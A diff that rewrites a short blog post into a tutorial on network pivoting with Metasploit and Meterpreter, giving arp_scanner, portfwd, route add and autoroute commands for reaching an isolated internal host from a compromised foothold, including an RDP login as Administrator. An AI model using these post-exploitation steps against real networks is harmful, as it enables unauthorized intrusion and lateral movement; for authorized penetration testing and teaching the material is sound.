@@ -1,50 +1,75 @@
 ---
-title: "port forward & pivoting  with meterpreter"
+title: "Network Pivoting and Port Forwarding with Metasploit and Meterpreter"
 date: 2015-01-08T22:55:55+00:00
 url: "/port-forward-pivoting-meterpreter/"
 draft: false
-description: "Let's assume u attacked machine with 2 nic cards our IP is 10.0.0.5 first, one ip is 10.0.0.10 that you reach it from and in ifconfig shows, the machine has a..."
-categories: ["blog", "Security", "tech"]
+description: "How to pivot through compromised multi-homed hosts into isolated internal networks using Meterpreter's portfwd and Metasploit autoroute."
+categories: ["Security", "exploit-dev"]
+tags: ["metasploit", "meterpreter", "pivoting", "port-forwarding", "lateral-movement", "red-team"]
 ---
 
-Let's assume u attacked machine with 2 nic cards
+During penetration tests and red team operations, an initial compromised foothold often resides in a perimeter network (DMZ) or employee subnet. These dual-homed hosts can act as springboards (**pivots**) to reach isolated internal segments unreachable from your attack workstation.
 
-our IP is 10.0.0.5
+---
 
-first, one ip is 10.0.0.10 that you reach it from
+### The Network Scenario
 
-and in ifconfig shows, the machine has a different  IP 10.0.2.30
+- **Attacker Workstation:** `10.0.0.5`
+- **Compromised Host (Dual-Homed Foothold):**
+  - External NIC: `10.0.0.10`
+  - Internal Private Subnet NIC: `10.0.2.15`
+- **Internal Target Host (Isolated):** `10.0.2.30`
 
-you can scan the network 10.0.2.x via meterpreter
+---
 
-arp_scan
+### Step 1: Internal Subnet Discovery (`arp_scanner`)
 
+From your active Meterpreter session on the compromised host, discover live hosts on the internal `10.0.2.0/24` subnet using ARP requests:
+
+```text
+meterpreter > run post/windows/gather/arp_scanner RHOSTS=10.0.2.0/24
+# Discovered live host: 10.0.2.30 (00:0c:29:ab:cd:ef)
 ```
-meterpreter > run arp_scan -r 10.0.2.1-255
-```
 
-we can connect to the RDP server of the machine 10.0.2.30
+---
 
-via adding a route from out local port 9389 to the machine 10.0.2.30:3389
+### Method 1: Local Port Forwarding via `portfwd`
 
-```
+If you want to access a specific internal service (e.g., Remote Desktop on `10.0.2.30:3389`) directly from your attack workstation:
+
+```text
 meterpreter > portfwd add -l 9389 -p 3389 -r 10.0.2.30
 ```
+- `-l 9389`: Binds local listening port `9389` on your attack workstation.
+- `-p 3389`: Target port on the destination server.
+- `-r 10.0.2.30`: Target IP inside the private network.
 
-so now we can connect to our local port 0.0.0.0:9389 and it will redirect us to 10.0.2.30:3389
+Now, launch your RDP client against `localhost`:
 
- 
-
-pivoting is easier to do with Metasploit  session
-
+```bash
+xfreerdp /v:127.0.0.1:9389 /u:Administrator
 ```
-route add 10.0.2.1 255.255.255.0 1
+Meterpreter transparently tunnels the RDP session through the compromised foothold to `10.0.2.30:3389`.
+
+---
+
+### Method 2: Subnet-Wide Routing (`autoroute` / `route add`)
+
+To allow *all* Metasploit auxiliary and exploit modules to route packets seamlessly through the compromised session:
+
+Background the Meterpreter session (assuming it is Session 1) and add a route:
+
+```text
+msf6 > route add 10.0.2.0 255.255.255.0 1
+[*] Route added to subnet 10.0.2.0/255.255.255.0 through session 1
 ```
 
-the last number is the session id
+Or use the automated post module:
 
-so now u can attack the machine  10.0.2.30 directly
+```text
+msf6 > use post/multi/manage/autoroute
+msf6 post(multi/manage/autoroute) > set SESSION 1
+msf6 post(multi/manage/autoroute) > run
+```
 
- 
-
-have fun!
+You can now launch internal exploits and port scans against `10.0.2.30` as if you were plugged directly into the private switch.
